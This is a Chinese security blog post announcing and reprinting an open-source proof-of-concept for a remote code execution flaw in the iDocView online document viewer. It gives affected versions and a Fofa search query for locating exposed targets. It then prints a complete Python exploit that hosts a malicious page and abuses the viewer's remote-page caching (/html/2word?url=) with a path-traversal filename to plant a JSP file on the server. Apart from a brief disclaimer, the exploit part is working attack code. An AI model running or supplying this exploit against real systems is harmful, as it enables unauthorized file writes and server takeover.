#  POC|SpringKill的IDOC_RCE利用POC   
原创 春纱  卫界安全-阿呆攻防   2023-11-23 22:30  
  
爱好开源的大牛子，不光代审分析了这个漏洞，现在又把这个漏洞POC开源出来了，大家看不懂分析的学习一下，已经有小伙伴找他击剑了，呆哥替他欢迎大家骚扰。  
  
SpringKill师傅的Github地址：https://github.com/springkill  
  
sdfd  

				
				  
  
   
  
01  
  
工具简介  
  

				
				  
  
 **- 项目名称：**springkill/idocv_poc  
  
**- 项目地址：**  
```
https://github.com/springkill/idocv_poc
```  
  
**- 项目描述：**  
  
I DOC VIEW RCE的Poc，本脚本仅供合法的有授权的测试使用，切勿用于未授权场景，切勿用于任何非法途径！！  
任何人使用此Poc进行非法操作造成的后果，SpringKill不承担任何责任！！！  
  
**- 项目优点：**  
  
1day poc  
  
   
  
02  
  
产品简介  
  

				
				  
  
iDocView是一个在线文档解析应用，旨在提供便捷的文件查看和编辑服务。  
  
   
  
03  
  
漏洞概述   
  

				
				  
  
本次漏洞出现在在线文档解析应用中的远程页面缓存功能。具体问题在于该应用未能对用户输入的URL进行充分的安全验证，从而导致存在安全隐患。攻击者可通过构造特殊的URL，引诱应用下载恶意文件。  
  
   
  
04  
  
影响范围  
  

				
				  
  
 iDocView < 13.10.1_20231115  
  
   
  
05  
  
Fofa语句  
  

				
				  
  
 title=="在线文档预览 - I Doc View"  
  
   
  
06  
  
POC用法  
  

				
				  
```
python3 script.py <IP_ADDRESS> <PORT> <REMOTE_IP> <REMOTE_PORT>
```  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_gif/hFPkDXcMlMtY5N1d8sEQr8HD71NJmHaMEYdwO1WolgF2U3w8jGL0KY73WIzWWLN3gIB7ciapBwHkWbVDoHu76Hg/640?wx_fmt=gif&from=appmsg "")  
  
```
import http.server
import socketserver
import sys
import threading
import requests

visited_pages = {'/': False, '/..\..\..\docview\poc.jsp': False}

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global visited_pages
        if self.path in visited_pages:
            visited_pages[self.path] = True

            if all(visited_pages.values()):
                print("Success! Go to http://{}:{}/poc.jsp".format(remote_ip,remote_port))
                threading.Thread(target=server.shutdown).start()

        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f'''<html>
<head><title>Index Page</title></head>
<body>
    <link href="http://{ip_address}:{port}/..\..\..\docview\poc.jsp">
</body>
</html>'''
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/..\..\..\docview\poc.jsp':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Poc Works!</h1></body></html>")
        else:
            self.send_error(404, "File not found")

    def log_message(self, format, *args):
        return

def send_request_to_remote():
    remote_url = f'http://{remote_ip}:{remote_port}/html/2word?url={ip_address}:{port}'
    try:
        response = requests.get(remote_url)
    except Exception as e:
        pass

if len(sys.argv) < 5:
    print("Usage: python script.py <IP_ADDRESS> <PORT> <REMOTE_IP> <REMOTE_PORT>")
    sys.exit(1)

ip_address = sys.argv[1]
port = int(sys.argv[2])
remote_ip = sys.argv[3]
remote_port = sys.argv[4]

def start_server():
    global server
    server = socketserver.TCPServer((ip_address, port), MyHttpRequestHandler)
    server.serve_forever()

server_thread = threading.Thread(target=start_server)
server_thread.start()

send_request_to_remote()
```  
  
  
